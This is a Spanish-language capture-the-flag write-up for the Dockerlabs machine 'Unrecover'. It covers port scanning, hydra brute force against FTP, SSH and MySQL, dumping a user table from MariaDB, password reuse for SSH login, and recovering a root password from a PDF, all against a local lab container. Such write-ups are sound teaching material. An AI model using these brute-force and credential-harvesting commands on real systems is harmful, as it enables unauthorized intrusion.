
# Writeup Template: Maquina `[ Unrecover ]`

- Tags: #Unrecover #mariadb
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Unrecover](https://mega.nz/file/bEEwjTaY#tYV9KObUVL1qARVf-pBkcW-n_3qGUmaYSW-HXpf6dNE) Laboratorio sobre recuperación de datos y técnicas de análisis forense.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x unrecover.zip
sudo bash auto_deploy.sh unrecover.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,80,3306 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((DebianOracular))
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6
```
---
## Enumeracion FTP:
Tenemos un servicio expuesto que procederemos a enumerar usuario **anonymous** o recursos compartidos:
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2 # No reporta usuario anonymous
```

De momento no obtenemos nada para este servicionpero dejaremos un atraque de fuerza bruta con **hydra** con usuarios tipicos:
```bash
hydra -l /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://172.17.0.2
```
## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```

Ingreando a la web, No indica de un usario **capybara**, que probaremos con un ataque de fuerza bruta por **ssh** ya que esta expuesto, en lo que seguimos enumerando la web principal:
```bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Zoo de Capybaras]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta rutas
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta rutas

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
	No reporta archivos

### Analisis de Imagenes:
Descargamos las tres imagenes de la web para aplicar **esteganografia** y verificar si es que existe algun archivo oculto en ellas
```bash
capybarafeliz.jpg   capybaramistoso.jpg   capybaranarrador.jpg
```

Tenemos tres imagenes que tenemos que auditar, Verificando primero eltipo de archivo:
```bash
❯ file capybarafeliz.jpg
capybarafeliz.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=6, xresolution=86, yresolution=94, resolutionunit=2], baseline, precision 8, 640x427, components 3

❯ file capybaramistoso.jpg
capybaramistoso.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 318x159, components 3
                           
❯ file capybaranarrador.jpg
capybaranarrador.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 240x240, segment length 16, baseline, precision 8, 1600x899, components 3
```

Revisando si contiene caracteres legibles:
```bash
strings capybarafeliz.jpg | grep -i "password\|secret\|flag"
strings capybaramistoso.jpg | grep -i "password\|secret\|flag"
strings capybaranarrador.jpg | grep -i "password\|secret\|flag"
```

Al paracer no existe ningun archivo oculto en alguna imagen.

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Sabiendo que tenemos un posible usuario procedemos a realizar un ataque de fuerza bruta al servicio **mysql** que tambine esta expuesto:
```bash
hydra -l capybara -P /usr/share/wordlists/rockyou.txt -t 4 -f mysql://172.17.0.2
```

Ahora que tenemos credenciales validas las usaremos para conectarnos a la bd
```bash
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybara   password: password1
```

### Ejecucion del Ataque
```bash
# Comandos para explotación
mysql -u capybara -h 172.17.0.2 -ppassword1 --skip-ssl
```

Ahora que ganamos acceso a la base de datos procedemos a enumerar posibles **usuarios** y **contrasenas** validas para ganar acceso al servidor
```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| beta               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Ahora nos cambiamos de base de datos a **beta**
```bash
MariaDB [(none)]> use beta;
```

Revisamos las tablas para esta base de datos:
```bash
MariaDB [beta]> show tables;
+----------------+
| Tables_in_beta |
+----------------+
| registraton    |
+----------------+
```

Revisamos la estructura de la base de datos:
```bash
MariaDB [beta]> desc registraton;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(50)  | NO   |     | NULL    |                |
| password | varchar(255) | NO   |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
```

Ahora nos aprovechamos de esto para ver el campo **username** y el campo **password**, En caso de que este cifrada la informacion tendremos que aplicar fuerza bruta para romper el cifrado.
```bash
select username, password from registraton;
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| balulero | 520d3142a140addb8be7d858a7e29e15 |
+----------+----------------------------------+
```

Tenemos un usuario potencial **balulero** en el sistema, y con su password es que mas seguro **md5**
```bash
hashid 520d3142a140addb8be7d858a7e29e15
Analyzing '520d3142a140addb8be7d858a7e29e15'
[+] MD2 
[+] MD5
```

Usando este herramienta only [md5decrypt](https://10015.io/tools/md5-encrypt-decrypt) pero no obtenemos nada, 
### Intrusion
Ahora lo que aremos es usar al usuario **capybara** como **passowrd** para el usuario **balulero**
Existe reutilizacion de credenciales entre los usuarios
```bash
# Reverse shell o acceso inicial
ssh balulero@172.17.0.2 # ( password1 )
```

---

## Escalada de Privilegios

###### Usuario `[ Balulero ]`:
En esta ruta tenemos lo siguiente:
```bash
/home/balulero/server

-rw-r--r-- 1 root root 31654 Feb  2 11:21 backup.pdf
```

Nos transferimos a nuestra maquina de atacante:
```bash
scp balulero@172.17.0.2:/home/balulero/server/backup.pdf . # ( password1 )
```

Ahora que tenemos el archivo en nuestra maquina de atacante, al abrirlo tenemos un apartado donde nos indica que es una contrasena pero esta **ofuscada**, Asi que usamo esta herramienta only: 
[Estegoline](https://stegonline.georgeom.net/) para desofuscar la imagen: y obtenemos el texto ya desofuscado:
```bash
passwordpepinaca
```

Ahora usamo esta password para loguearnos com **root**
```bash
# Comando para escalar al usuario: ( root )
su root # ( passwordpepinaca )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@fefbd6f4706e:/home/balulero/server# whoami
root
```